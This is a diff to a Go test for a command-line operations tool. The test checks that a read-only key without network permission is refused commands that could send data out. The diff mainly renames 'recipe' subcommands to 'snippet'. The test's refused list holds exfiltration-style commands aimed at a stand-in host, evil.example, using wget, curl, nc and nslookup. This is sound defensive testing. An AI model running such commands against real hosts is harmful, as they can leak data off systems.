@@ -38,12 +38,12 @@ var (
 // A read key added without --network runs only komando's own reads of
 // targets in the inventory: nothing that dials a place the key names (cert
 // check of a URL), and no program of the key's choosing (exec, job
-// start, docker exec, cluster kubernetes exec, recipe run), which could send rows out
+// start, docker exec, cluster kubernetes exec, snippet exec), which could send rows out
 // in a URL or a DNS name.
 func TestGateNoNetwork(t *testing.T) {
 	invHome(t)
 	gateInventory(t)
-	mustRun(t, "recipe", "add", "my-df", "df -h", "--read-only")
+	mustRun(t, "snippet", "create", "my-df", "df -h", "--read-only")
 	const N = "SSH_GATE_NETWORK_REQUIRED"
 	refused := []string{
 		"cert check https://evil.example", "cert check web https://evil.example/x", "cert check smtps://evil.example",
@@ -51,7 +51,7 @@ func TestGateNoNetwork(t *testing.T) {
 		"x web --read-only -- nslookup a.evil.example", "run web --read-only -- wget -qO- evil.example",
 		"exec web --read-only --script -", "exec web --read-only --cmd 'nc evil 1'",
 		"job start web --read-only -- du -sh /var", "docker exec web app --read-only -- ls",
-		"cluster kubernetes exec k8s pod/x --read-only -- ls", "recipe run my-df web", "recipe run disk web",
+		"cluster kubernetes exec k8s pod/x --read-only -- ls", "snippet exec my-df web", "snippet exec disk web",
 		"-o json exec web --read-only -- curl https://evil.example", "--dry-run exec web --read-only -- uptime",
 	}
 	for _, line := range refused {
@@ -78,7 +78,7 @@ func TestGateNoNetwork(t *testing.T) {
 		"docker logs web app", "db query pg 'select 1'", "db schema pg", "db activity pg", "cache get c a", "cache redis raw c GET a",
 		"cache info c", "cluster kubernetes raw k8s get pods", "cluster status k8s", "cluster logs k8s api-1", "cert check web",
 		"cert check web --path /etc/ssl/site.pem", "pkg security web", "pkg installed web", "storage download s3 a.txt --to -",
-		"storage s3 object list s3", "job list", "audit", "export", "conn test pg", "vpn socks list",
+		"storage s3 object list s3", "job list", "audit list", "export", "conn test pg", "vpn socks list",
 		"exec --help", "cluster info k8s", "registry oci image list reg",
 	}
 	for _, line := range allowed {
